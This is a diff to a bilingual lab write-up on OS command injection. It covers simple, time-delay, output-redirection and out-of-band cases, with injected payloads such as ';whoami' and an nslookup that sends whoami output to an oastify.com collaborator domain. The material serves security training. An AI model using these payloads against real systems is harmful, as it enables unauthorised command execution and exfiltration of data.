@@ -34,11 +34,11 @@ tags:
 
 ## Inyección de comandos, caso simple || OS command injection, simple case
 
-![](Pasted%20image%2020250924172159.png)
+![](/img2/Pasted%20image%2020250924172159.png)
 
 > By corrupting the query, we see that we are within the context of command execution.
 
-![](Pasted%20image%2020250924172249.png)
+![](/img2/Pasted%20image%2020250924172249.png)
 
 > We concatenate our command using a ;. The underlying command would look like this:
 
@@ -51,10 +51,9 @@ sh -c bash /home/peter-GPnOhF/stockreport.sh 1 1;whoami
 ```bash
 ;whoami
 ```
-
 ## Inyección ciega con retrasos temporales || Blind OS command injection with time delays
 
-![](Pasted%20image%2020250924180005.png)
+![](/img2/Pasted%20image%2020250924180005.png)
 
 > By using backticks, we execute a command to check if it is vulnerable.
 
@@ -66,13 +65,13 @@ sh -c bash /home/peter-GPnOhF/stockreport.sh 1 1;whoami
 
 ## Inyección ciega con redirección de salida || Blind OS command injection with output redirection
 
-![](Pasted%20image%2020250924183354.png)
+![](/img2/Pasted%20image%2020250924183354.png)
 
 > First, we detect command injection using a sleep.
 
-![](Pasted%20image%2020250924183137.png)
+![](/img2/Pasted%20image%2020250924183137.png)
 
-![](Pasted%20image%2020250924183152.png)
+![](/img2/Pasted%20image%2020250924183152.png)
 
 > We send the output to a file inside the images directory `/var/www/images/`.
 
@@ -84,9 +83,9 @@ sh -c bash /home/peter-GPnOhF/stockreport.sh 1 1;whoami
 
 ## Inyección ciega con interacción OOB || Blind OS command injection with out-of-band interaction
 
-![](Pasted%20image%2020250924184546.png)
+![](/img2/Pasted%20image%2020250924184546.png)
 
-![](Pasted%20image%2020250924184559.png)
+![](/img2/Pasted%20image%2020250924184559.png)
 
 > In this case, we cannot force a delay in the response; however, we can detect the vulnerability via a DNS request.
 
@@ -98,19 +97,19 @@ sh -c bash /home/peter-GPnOhF/stockreport.sh 1 1;whoami
 
 ## Inyección ciega con exfiltración vía interacción OOB || Blind OS command injection with out-of-band data exfiltration
 
-![](Pasted%20image%2020250924184849.png)
+![](/img2/Pasted%20image%2020250924184849.png)
 
-![](Pasted%20image%2020250924184859.png)
+![](/img2/Pasted%20image%2020250924184859.png)
 
 > Just like the previous lab, we detect the vulnerability through a DNS request.
 
-![](Pasted%20image%2020250924185022.png)
+![](/img2/Pasted%20image%2020250924185022.png)
 
-![](Pasted%20image%2020250924185053.png)
+![](/img2/Pasted%20image%2020250924185053.png)
 
-> By using the bash $() operator, we make a request to our domain with the output of the whoami command as a subdomain.
+> Mediante el uso del operador $() de bash, hacemos una petición a nuestro domino con el output del comando whoami como subdominio.
 
-- Injection
+- Injección
 
 ```bash
 `nslookup $(whoami).c5iykdif65mgbiptmx2hwelcb3hw5mtb.oastify.com`
